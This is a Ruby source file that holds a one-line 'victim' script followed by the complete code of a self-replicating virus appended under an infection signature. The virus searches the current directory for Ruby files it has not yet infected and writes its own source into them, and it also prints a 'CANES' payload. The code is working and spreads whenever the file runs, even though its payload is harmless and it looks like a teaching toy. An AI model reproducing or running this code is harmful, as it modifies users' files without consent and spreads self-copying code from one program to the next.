#!/usr/bin/env ruby

puts "Hello I'm a victim!"
## "#@! infected by virus !@#"
## ./virus.rb infected test.rb

#!/usr/bin/env ruby 

# check the target for the signature
def infected?(filename)
  file = File.open(filename)
  data = file.read
  file.close

  if data.include? '#@! infected by virus !@#'
    true
  else
    false
  end
end

# find ruby source files that aren't infected yet
def select_target
  Dir.foreach(".") do |entry|
    if /.rb$/ === entry && entry != __FILE__
      return "#{entry}" unless infected? entry
    end
  end
end

# copy the code into the selected target
def copy_code_into(filename)
  target = File.open(filename, 'a+')
  source = File.open(__FILE__)
  code = source.read

  source.close

  target.puts '## "#@! infected by virus !@#"'
  target.puts "## #{__FILE__} infected #{filename}"
  target.puts
  target.write code

  target.close
end

# pretty self explanatory
def payload
  puts "C-A-N-E-S CANES!!!!"
end

payload
target = select_target
copy_code_into target unless target.nil?
